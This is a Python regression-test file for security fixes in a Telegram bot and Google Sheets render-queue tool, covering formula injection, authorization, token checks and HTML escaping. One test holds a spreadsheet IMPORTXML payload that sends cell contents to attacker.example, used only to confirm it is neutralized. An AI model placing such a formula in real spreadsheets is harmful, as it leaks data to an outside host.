#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Regression tests for the security and correctness fixes.

Each test pins down a specific defect that was found during the audit, so a future
refactor cannot silently reintroduce it.
"""

import sys
import tempfile
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

import ae_render_queue
import ae_render_trigger_server as trigger
import tg_sheet_monitor as monitor


class SheetFormulaInjectionTests(unittest.TestCase):
    """A plaque name is user input and must never become a live formula."""

    def test_equals_prefix_is_neutralized(self):
        payload = '=IMPORTXML("https://attacker.example/"&A1,"//a")'
        self.assertEqual(monitor.sheet_safe_text(payload), "'" + payload)

    def test_all_formula_trigger_characters_are_neutralized(self):
        for prefix in ("=", "+", "-", "@"):
            with self.subTest(prefix=prefix):
                self.assertTrue(monitor.sheet_safe_text(prefix + "CMD").startswith("'"))

    def test_leading_whitespace_does_not_bypass_the_guard(self):
        self.assertTrue(monitor.sheet_safe_text("\t =HYPERLINK()").startswith("'"))

    def test_ordinary_names_are_left_untouched(self):
        self.assertEqual(monitor.sheet_safe_text("Иванов Иван"), "Иванов Иван")
        self.assertEqual(monitor.sheet_safe_text(""), "")

    def test_table_values_sanitizes_every_cell(self):
        rows = [{"name": "=1+1", "position": "Директор"}]
        values = monitor.table_values(["name", "position"], rows)
        self.assertEqual(values[1][0], "'=1+1")
        self.assertEqual(values[1][1], "Директор")


class TelegramAuthorizationTests(unittest.TestCase):
    """Authorization must consider the acting user, not just the chat."""

    @staticmethod
    def allow(*ids):
        allowed = {str(item) for item in ids}
        return lambda value: str(value).strip() in allowed

    def test_private_chat_of_an_admin_is_allowed(self):
        chat = {"id": 111, "type": "private"}
        self.assertTrue(monitor.is_authorized_actor(chat, {"id": 111}, self.allow(111)))

    def test_group_member_does_not_inherit_group_permission(self):
        # The group id is allow-listed but the sender is not: this is the escalation
        # path that existed when only message.chat.id was checked.
        chat = {"id": -100200, "type": "supergroup"}
        self.assertFalse(monitor.is_authorized_actor(chat, {"id": 999}, self.allow(-100200)))

    def test_group_admin_is_still_allowed(self):
        chat = {"id": -100200, "type": "supergroup"}
        self.assertTrue(monitor.is_authorized_actor(chat, {"id": 999}, self.allow(-100200, 999)))

    def test_group_update_without_sender_is_rejected(self):
        chat = {"id": -100200, "type": "group"}
        self.assertFalse(monitor.is_authorized_actor(chat, {}, self.allow(-100200)))

    def test_unlisted_chat_is_rejected(self):
        chat = {"id": 5, "type": "private"}
        self.assertFalse(monitor.is_authorized_actor(chat, {"id": 5}, self.allow(111)))


class SpreadsheetIdParsingTests(unittest.TestCase):
    """AE_READY_SPREADSHEET_ID is routinely pasted as a full browser URL."""

    def test_full_url_is_reduced_to_the_id(self):
        url = "https://docs.google.com/spreadsheets/d/1--wpJs_8wKO9s_afrcAtoUQG8kvk-vhFgA0KjbmXcTU/edit#gid=0"
        self.assertEqual(monitor.spreadsheet_id_from_value(url), "1--wpJs_8wKO9s_afrcAtoUQG8kvk-vhFgA0KjbmXcTU")

    def test_bare_id_passes_through(self):
        self.assertEqual(monitor.spreadsheet_id_from_value("1J6nJHM4wXF66LJO7"), "1J6nJHM4wXF66LJO7")

    def test_empty_value_is_empty(self):
        self.assertEqual(monitor.spreadsheet_id_from_value(""), "")

    def test_unparseable_url_raises_instead_of_silently_failing(self):
        with self.assertRaises(monitor.ConfigError):
            monitor.spreadsheet_id_from_value("https://example.com/not-a-sheet")


class PlaqueBatchLimitTests(unittest.TestCase):
    def test_oversized_batch_is_rejected_with_a_size_message(self):
        text = "\n".join("Фамилия Имя{}_Должность".format(index) for index in range(60))
        with self.assertRaises(monitor.ConfigError) as caught:
            monitor.parse_plaque_batch(text)
        self.assertIn("до 50", str(caught.exception))

    def test_valid_batch_is_parsed(self):
        entries = monitor.parse_plaque_batch("Иванов Иван_Директор\nПетров Петр_Инженер")
        self.assertEqual(len(entries), 2)
        self.assertEqual(entries[0]["name"], "Иванов Иван")
        self.assertEqual(entries[1]["position"], "Инженер")


class TriggerTokenTests(unittest.TestCase):
    class FakeHandler:
        """Minimal stand-in exercising TriggerHandler.token_ok without a socket."""

        def __init__(self, token, headers):
            self.headers = headers
            self.server = type("S", (), {"trigger_token": token})()

        token_ok = trigger.TriggerHandler.token_ok

    def test_correct_bearer_token_is_accepted(self):
        handler = self.FakeHandler("s3cret", {"Authorization": "Bearer s3cret"})
        self.assertTrue(handler.token_ok())

    def test_correct_header_token_is_accepted(self):
        handler = self.FakeHandler("s3cret", {"X-AE-Trigger-Token": "s3cret"})
        self.assertTrue(handler.token_ok())

    def test_wrong_token_is_rejected(self):
        handler = self.FakeHandler("s3cret", {"Authorization": "Bearer nope"})
        self.assertFalse(handler.token_ok())

    def test_prefix_of_the_token_is_rejected(self):
        handler = self.FakeHandler("s3cret", {"Authorization": "Bearer s3c"})
        self.assertFalse(handler.token_ok())

    def test_missing_credentials_are_rejected(self):
        self.assertFalse(self.FakeHandler("s3cret", {}).token_ok())


class TriggerHostBindingTests(unittest.TestCase):
    def test_loopback_addresses_are_recognized(self):
        for host in ("127.0.0.1", "localhost", "::1", ""):
            with self.subTest(host=host):
                self.assertTrue(trigger.is_loopback_host(host))

    def test_public_addresses_are_not_loopback(self):
        for host in ("0.0.0.0", "192.168.1.10", "example.com"):
            with self.subTest(host=host):
                self.assertFalse(trigger.is_loopback_host(host))

    def test_server_refuses_public_bind_without_a_token(self):
        with self.assertRaises(SystemExit):
            trigger.main(["--host", "0.0.0.0", "--token", ""])


class TriggerSingletonTests(unittest.TestCase):
    def test_second_trigger_instance_is_rejected(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            lock_path = Path(temp_dir) / "trigger.lock"
            first = trigger.acquire_singleton_lock(lock_path)
            try:
                with self.assertRaises(SystemExit):
                    trigger.acquire_singleton_lock(lock_path)
            finally:
                first.close()

            second = trigger.acquire_singleton_lock(lock_path)
            second.close()


class TriggerPayloadValidationTests(unittest.TestCase):
    CONFIG = {"queue_path": "/tmp/never-written.json"}

    def test_non_object_payload_is_rejected(self):
        with self.assertRaises(ValueError):
            trigger.enqueue_payload(self.CONFIG, ["not", "a", "dict"])

    def test_unknown_kind_is_rejected(self):
        with self.assertRaises(ValueError):
            trigger.enqueue_payload(self.CONFIG, {"kind": "session_topic", "name": "A B", "position": "X"})

    def test_missing_fields_are_rejected(self):
        with self.assertRaises(ValueError):
            trigger.enqueue_payload(self.CONFIG, {"kind": "plaque", "name": "A B"})

    def test_oversized_fields_are_rejected(self):
        payload = {"kind": "plaque", "name": "A" * 5000, "position": "X"}
        with self.assertRaises(ValueError):
            trigger.enqueue_payload(self.CONFIG, payload)


class RenderQueueTests(unittest.TestCase):
    def test_poller_default_still_dedupes_failed_jobs(self):
        # The periodic sheet poller must not recreate a broken render every minute.
        self.assertIn("error", ae_render_queue.DEFAULT_DEDUPE_STATUSES)

    def test_user_retry_set_allows_resubmitting_after_a_failure(self):
        self.assertNotIn("error", ae_render_queue.USER_RETRY_DEDUPE_STATUSES)
        self.assertIn("queued", ae_render_queue.USER_RETRY_DEDUPE_STATUSES)
        self.assertIn("done", ae_render_queue.USER_RETRY_DEDUPE_STATUSES)

    def test_prune_keeps_active_jobs_and_drops_oldest_finished(self):
        data = {"jobs": []}
        for index in range(10):
            data["jobs"].append({
                "id": "done{}".format(index),
                "status": "done",
                "updated_at": "2026-01-{:02d}T00:00:00".format(index + 1),
            })
        data["jobs"].append({"id": "live", "status": "queued", "updated_at": "2020-01-01T00:00:00"})

        removed = ae_render_queue.prune_terminal_jobs(data, keep=4)

        self.assertEqual(removed, 6)
        remaining = [job["id"] for job in data["jobs"]]
        self.assertIn("live", remaining, "an active job must never be pruned")
        self.assertEqual(len(remaining), 5)
        # The four newest finished jobs survive.
        self.assertEqual(sorted(job for job in remaining if job != "live"), ["done6", "done7", "done8", "done9"])

    def test_prune_is_a_no_op_below_the_limit(self):
        data = {"jobs": [{"id": "a", "status": "done", "updated_at": "2026-01-01T00:00:00"}]}
        self.assertEqual(ae_render_queue.prune_terminal_jobs(data, keep=500), 0)
        self.assertEqual(len(data["jobs"]), 1)


class TelegramHtmlEscapingTests(unittest.TestCase):
    """Sheet and AI text reaches Telegram in HTML parse mode."""

    def test_markup_in_a_title_is_escaped(self):
        rendered = monitor.render_telegram_message("<b>x</b>", "")
        self.assertIn("&lt;b&gt;x&lt;/b&gt;", rendered)

    def test_markup_in_a_body_line_is_escaped(self):
        rendered = monitor.render_telegram_message("t", '<a href="https://evil">click</a>')
        self.assertNotIn('<a href="https://evil">', rendered)
        self.assertIn("&lt;a href=", rendered)


if __name__ == "__main__":
    unittest.main(verbosity=2)
